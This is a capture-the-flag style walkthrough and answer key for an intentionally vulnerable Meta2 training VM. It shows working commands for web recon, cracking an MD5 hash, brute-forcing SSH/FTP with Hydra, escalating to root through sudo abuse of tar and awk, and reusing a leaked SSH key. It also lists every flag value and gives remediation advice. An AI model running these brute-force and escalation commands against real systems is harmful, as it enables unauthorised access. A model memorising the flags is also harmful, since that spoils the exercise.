# Meta2 v2 — Walkthrough

> **At a glance**
>
> **What it is:** The intended solution route and remediation notes for the Meta2 v2 assessment workbook.
> **Workbook:** [Meta2 v2 - Workbook](v2-workbook.md) · **Project:** [Meta2](README.md) · **Domain:** [G5Labs](../README.md)

> **Authorised Lab Only**
>
> These steps belong to the intentionally vulnerable Meta2 environment. Reuse techniques only where you have explicit authority.

---

**Target:** `192.168.56.189` (Meta2)  
**Attack Box:** `192.168.56.204` (Kali Linux)  
**Capability Learning stages:** I recognise → I know → I can choose → I can interpret → I can adapt  
**Snapshot Baseline:** `Meta2_Enumeration_v2`

---

## Lab Architecture & User Tiers

| User | Context / Role | Foothold / Attack Vector | Target Privilege |
| :--- | :--- | :--- | :--- |
| Unauthenticated visitor | HTTP content | Web Recon (`robots.txt`); no login as `websvc` implied | Objective 1 |
| `avejoe` | Standard User | Leaked Cleartext Config | Flags 2 & 3 |
| `analyst` | Over-Privileged Operator | Network Brute Force (Hydra) | Flag 4 |
| `secops` | Security Operator | GTFOBins (`tar`) / SSH Private Key | Flags 5 & 6 |
| `root` | System Administrator | Sudo Misconfiguration (`awk`) | Flag 7 |

---

## Flag Walkthrough

#### Flag 1 — Web Reconnaissance & Directory Discovery
* **Capability Stage:** *I recognise* (Information leakage via common web markers)
* **Execution:**

  ```bash
  curl -s http://192.168.56.189/robots.txt
  ```

- **Discovery:** Identifies disallowed path `/internal_dev_notes/`. The current answer key defines this discovery as Objective 1; it does not record a separate Flag 1 value.

#### Flag 2 — Insecure Secret Storage & Cleartext Credentials

- **Capability Stage:** _I know_ (Developers frequently leave staging/backup configs exposed)

- **Execution:**

    ```
    curl -s http://192.168.56.189/internal_dev_notes/db_backup.conf
    ```

- **Recovery:**

    - **Flag:** `FLAG{v2_p1a1nt3xt_d3v_cr3ds_d1sc0v3r3d}`

    - **Credentials:** `avejoe:Spring2024!`

#### Flag 3 — Hash Identification & Offline Cracking

- **Capability Stage:** _I know_ (Distinguishing raw text from hashes and choosing the correct attack mode)

- **Execution:**

    1. Authenticate as `avejoe` via SSH:

        ```
        ssh avejoe@192.168.56.189
        ```

    2. Inspect directory notes:

        ```
        cat /home/avejoe/.notes/legacy_hashes.txt
        ```

    3. Extract hash (`5ebe2294ecd0e0f08eab7690d2a6ee69`) and identify algorithm:

        ```
        hashid 5ebe2294ecd0e0f08eab7690d2a6ee69
        ```

    4. Save the observed hash to `hash.txt` on Kali before cracking it. Length and `hashid` are hints; confirm the raw-MD5 format from the source/context:

        ```bash
        printf '%s\n' 5ebe2294ecd0e0f08eab7690d2a6ee69 > hash.txt
        ```

        Then use John:

        ```
        john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
        ```

- **Recovery:**

    - **Flag:** `FLAG{v2_h4sh_hunt3r_c0mpl3t3}`

    - **Cracked Value:** `secret`

#### Flag 4 — Over-Privileged Account & Network Authentication

- **Capability Stage:** _I can choose_ (Targeting weak network credentials and identifying sudo delegations)

- **Execution:**

    1. Attack the `analyst` account using Hydra:

        ```
        hydra -l analyst -P /usr/share/wordlists/fasttrack.txt ssh://192.168.56.189
        # Alternatively via FTP:
        hydra -l analyst -P /usr/share/wordlists/fasttrack.txt ftp://192.168.56.189
        ```

    2. Log in and inspect permissions:

        ```
        ssh analyst@192.168.56.189
        cat /home/analyst/FLAG4.txt
        sudo -l
        ```

- **Recovery:**

    - **Flag:** `FLAG{v2_hydr4_0v3rpr1v_4n4lyst_4cc3ss}`

    - **Sudo Right:** `(secops) NOPASSWD: /bin/tar`

#### Flag 5 — Password Policies & Symmetric Cryptography

> **Check the Required Account First**
>
> Record whether the current identity can read `/opt/crypto`. If access requires `secops`, establish that boundary using the intended route in Flag 6, then return here. Objective numbers are not proof of execution order.

- **Capability Stage:** _I can interpret_ (Applying policy constraints to generate custom wordlists)

- **Execution:**

    1. Inspect the crypto vault:

        ```
        cat /opt/crypto/README.txt
        ```

    2. Generate a wordlist matching the `SeasonYear` rule (`Autumn2024`):

        ```
        printf '%s\n' Autumn2024 Spring2024 Summer2024 Winter2024 > seasons.txt
        ```

    3. Read the vault instructions for the cipher, digest and key-derivation settings. The loop below uses the draft's non-PBKDF2 options; add or change options only to match the lab's original encryption settings. Run it where both the encrypted file and `seasons.txt` are available:

        ```
        while IFS= read -r pass; do
          if printf '%s\n' "$pass" | openssl enc -d -aes-256-cbc \
            -in /opt/crypto/vault.enc -pass stdin -out candidate.txt 2>/dev/null; then
            if grep -q 'FLAG{' candidate.txt; then
              printf 'Candidate: %s\n' "$pass"
              cat candidate.txt
              break
            fi
          fi
        done < seasons.txt
        ```

- **Recovery:** `FLAG{v2_a3s_256_p0l1cy_crack3d}`

#### Flag 6 — Private Key Discovery & Privilege Escalation

- **Capability Stage:** _I can adapt_ (Pivoting via GTFOBins and staging SSH key material)

- **Execution:**

    - **Route A (GTFOBins via Analyst):**

        ```
        sudo -u secops /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
        ```

    - **Route B (Harvested Key):**

        1. Locate backup: `/var/backups/keys/secops_id_rsa`. Confirm that your current account can read it and record where it came from.

        2. From Kali, copy the readable key using the account that found it, then protect the local copy. If `avejoe` can read it:

            ```bash
            scp avejoe@192.168.56.189:/var/backups/keys/secops_id_rsa ./secops_id_rsa
            ```

            Use that account's discovered lab password. If permission is denied, record the result and use the intended `tar` route after confirming its sudo permission instead. Then connect:

            ```
            chmod 600 secops_id_rsa
            ssh -i secops_id_rsa secops@192.168.56.189
            whoami
            id
            ```

- **Recovery:** `FLAG{v2_pr1v4t3_k3y_hyg13n3_f41lur3}`

#### Flag 7 — Filtering Decoys & Root Elevation

- **Capability Stage:** _Full Execution_ (Differentiating rabbit holes from actionable vectors)

- **Decoy Traps:**

    - Base64 cache: `/var/tmp/.config_cache` (Decodes to a decoy warning)

    - Immutable cron job: `/opt/scripts/backup.sh` (Recorded permissions: `744 root:root`; also inspect parent directories and called files before ruling out a replacement route)

- **True Path:**

    1. Check sudo rights on `secops`:

        ```
        sudo -l
        ```

    2. Abuse `awk` GTFOBin to pop root shell:

        ```
        sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
        ```

    3. Retrieve final flag:

        ```
        cat /root/FLAG7.txt
        ```

- **Recovery:** `FLAG{v2_r00t_m4st3r_c0mpl3t3_p4th}`

## Defensive & Remediation Notes

- **Credential Hygiene:** Disallow world-readable database configuration files (`chmod 600` or `640` with restricted group ownership; remove secrets from public web content).

- **Least Privilege:** Do not grant wildcard sudo access to binaries with command execution capabilities (`tar`, `awk`).

- **SSH Key Isolation:** Protect private keys and backups with restrictive ownership/access, normally `600` for the key. Revoke and replace leaked keys; moving them alone does not undo exposure.

- **Legacy Protocols:** Disable weak ciphers and insecure legacy services (FTP/Telnet) across internal subnets.

## Troubleshooting and Evidence

> **What Is Confirmed**
>
> My 2026-10-07 host check reached FTP, SSH, HTTP, SMB, NFS and MySQL. The live `robots.txt` and backup config match v2. Later account transitions, crypto settings and root proof still need an end-to-end run from Kali; the expected flags above are the existing answer key, not newly verified results.

> **Follow the Account**
>
> Record `whoami`, `id` and `sudo -l` after each transition. A command that reads a flag and a command that proves a new identity answer different questions.

<details>
<summary>OpenSSL Compatibility</summary>

Encryption and decryption must use matching options. Older files may use a different digest from modern defaults. Do not add `-pbkdf2` simply to silence a warning. CBC padding can accept a wrong candidate by chance: inspect the expected content as well. See [OpenSSL enc documentation](https://docs.openssl.org/master/man1/openssl-enc/).

</details>
